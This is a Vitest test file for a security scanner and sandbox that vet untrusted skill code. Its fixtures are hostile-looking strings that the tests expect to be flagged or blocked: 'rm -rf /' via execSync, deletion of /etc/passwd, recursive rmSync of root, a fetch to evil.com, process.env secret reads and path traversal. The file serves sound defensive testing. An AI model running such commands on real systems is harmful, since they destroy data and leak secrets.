import { describe, it, expect } from "vitest";
import { scanSkill, sandboxExecute } from "../src/lib/tools/security.js";

// ── scanSkill ─────────────────────────────────────────────────────────

describe("scanSkill", () => {
  it("marks safe code as safe", () => {
    const result = scanSkill("const x = 1;");
    expect(result.safe).toBe(true);
    expect(result.warnings).toEqual([]);
  });

  it("detects eval()", () => {
    const result = scanSkill("eval('danger')");
    expect(result.safe).toBe(false);
    expect(result.warnings.some((w) => w.toLowerCase().includes("eval"))).toBe(
      true,
    );
  });

  it("detects require + child_process + execSync", () => {
    const result = scanSkill("require('child_process').execSync('rm -rf /')");
    expect(result.safe).toBe(false);
    // Should have warnings for require, child_process, execSync, and exec
    expect(result.warnings.length).toBeGreaterThanOrEqual(3);
    expect(
      result.warnings.some((w) => w.toLowerCase().includes("require")),
    ).toBe(true);
    expect(
      result.warnings.some((w) => w.toLowerCase().includes("child_process")),
    ).toBe(true);
    expect(
      result.warnings.some((w) => w.toLowerCase().includes("execsync")),
    ).toBe(true);
  });

  it("detects fs.unlinkSync in an import statement", () => {
    const result = scanSkill(
      "import fs from 'fs'; fs.unlinkSync('/etc/passwd')",
    );
    expect(result.safe).toBe(false);
    expect(
      result.warnings.some((w) => w.toLowerCase().includes("unlinksync")),
    ).toBe(true);
  });

  it("detects new Function()", () => {
    const result = scanSkill("const fn = new Function('return 1')");
    expect(result.safe).toBe(false);
    expect(
      result.warnings.some((w) => w.includes("new Function")),
    ).toBe(true);
  });

  it("detects process.env access", () => {
    const result = scanSkill("const secret = process.env.SECRET_KEY;");
    expect(result.safe).toBe(false);
    expect(
      result.warnings.some((w) => w.includes("process.env")),
    ).toBe(true);
  });

  it("detects network access via fetch", () => {
    const result = scanSkill("fetch('https://evil.com/data')");
    expect(result.safe).toBe(false);
    expect(
      result.warnings.some((w) => w.toLowerCase().includes("fetch")),
    ).toBe(true);
  });

  it("detects external imports", () => {
    const result = scanSkill("import axios from 'axios';");
    expect(result.safe).toBe(false);
    expect(
      result.warnings.some((w) => w.includes('External import: "axios"')),
    ).toBe(true);
  });

  it("allows relative imports", () => {
    const result = scanSkill("import { foo } from './utils.js';");
    expect(result.safe).toBe(true);
    expect(result.warnings).toEqual([]);
  });

  it("allows node: prefixed built-in imports", () => {
    const result = scanSkill("import { join } from 'node:path';");
    expect(result.safe).toBe(true);
    expect(result.warnings).toEqual([]);
  });

  it("detects path traversal with __dirname", () => {
    const result = scanSkill("const p = __dirname + '/../../../etc/passwd';");
    expect(result.safe).toBe(false);
    expect(
      result.warnings.some((w) => w.toLowerCase().includes("path traversal")),
    ).toBe(true);
  });

  it("detects destructive fs.rmSync", () => {
    const result = scanSkill("fs.rmSync('/', { recursive: true })");
    expect(result.safe).toBe(false);
    expect(
      result.warnings.some((w) => w.includes("rmSync")),
    ).toBe(true);
  });

  it("detects destructured fs imports (bare unlinkSync)", () => {
    const result = scanSkill(
      'import { unlinkSync } from "fs"; unlinkSync("/tmp/x");',
    );
    expect(result.safe).toBe(false);
    expect(
      result.warnings.some((w) => w.toLowerCase().includes("unlinksync")),
    ).toBe(true);
  });

  it("flags dangerous module imports as external", () => {
    const result = scanSkill("import net from 'net';");
    expect(result.safe).toBe(false);
    // Should trigger both the danger-pattern for net.connect (if present)
    // or at minimum an external-import warning for 'net'
    expect(
      result.warnings.some((w) => w.includes("External import")),
    ).toBe(true);
  });
});

// ── sandboxExecute ────────────────────────────────────────────────────

describe("sandboxExecute", () => {
  it("runs simple arithmetic", () => {
    const result = sandboxExecute("1 + 1");
    expect(result.success).toBe(true);
  });

  it("captures console.log output", () => {
    const result = sandboxExecute("console.log(2 + 2)");
    expect(result.success).toBe(true);
    expect(result.output).toBe("4");
  });

  it("fails when accessing process", () => {
    const result = sandboxExecute("process.exit(1)");
    expect(result.success).toBe(false);
    expect(result.error).toBeDefined();
  });

  it("fails on infinite loop (timeout)", { timeout: 15_000 }, () => {
    const result = sandboxExecute("while(true){}");
    expect(result.success).toBe(false);
    expect(result.error).toBeDefined();
  });

  it("fails when accessing require", () => {
    const result = sandboxExecute("require('fs')");
    expect(result.success).toBe(false);
    expect(result.error).toBeDefined();
  });

  it("provides safe globals like Math and JSON", () => {
    const result = sandboxExecute("console.log(Math.max(1, 2, 3))");
    expect(result.success).toBe(true);
    expect(result.output).toBe("3");
  });

  it("captures multiple console.log lines", () => {
    const result = sandboxExecute(
      "console.log('hello'); console.log('world');",
    );
    expect(result.success).toBe(true);
    expect(result.output).toBe("hello\nworld");
  });
});
